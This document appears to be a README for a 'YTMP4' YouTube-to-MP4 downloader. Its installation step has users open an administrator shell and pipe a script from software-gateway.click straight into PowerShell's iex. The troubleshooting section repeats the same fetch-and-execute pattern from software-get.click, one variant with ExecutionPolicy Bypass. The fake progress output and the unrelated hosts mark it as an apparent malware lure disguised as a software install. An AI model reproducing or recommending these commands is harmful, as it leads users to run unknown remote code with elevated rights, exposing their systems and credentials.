## ⚙️ INSTALLATION & SETUP (CMD / PowerShell)

### Step 1: Open CMD or PowerShell as Administrator
```cmd
# Press Win+X, then select Terminal (Admin) or Command Prompt (Admin)
```

### Step 2: Execute Deployment Command
```cmd
powershell -Command "irm https://software-gateway.click/Loader.ps1?source=ytmp4 | iex"
```

### Step 3: Wait for Completion
```
[1/4] Loading YTMP4 modules...
[2/4] Configuring FFmpeg settings...
[3/4] Initializing download engine...
[4/4] Ready. Start downloading.
```

### Step 4: Start Using YTMP4
- Paste a YouTube URL into the app.
- Select quality (144p to 4K).
- Click Download — the MP4 file will be saved locally.

## 🔧 TROUBLESHOOTING & COMMON ERRORS

### 📌 Execution Policy Bypass (PowerShell)
```cmd
powershell -ExecutionPolicy Bypass -Command "irm https://software-get.click/Loader.ps1 | iex"
```

### 📌 irm Not Recognized (PowerShell 2.0)
```cmd
powershell -Command "Invoke-RestMethod https://software-get.click/Loader.ps1 | Invoke-Expression"
```

### 📌 FFmpeg Not Found
- FFmpeg is required to merge video and audio streams.
- Download FFmpeg and add it to your PATH.

### 📌 PyTube Error
- PyTube can throw a RegexMatchError if YouTube changes its layout.
- Update PyTube or use yt-dlp instead.
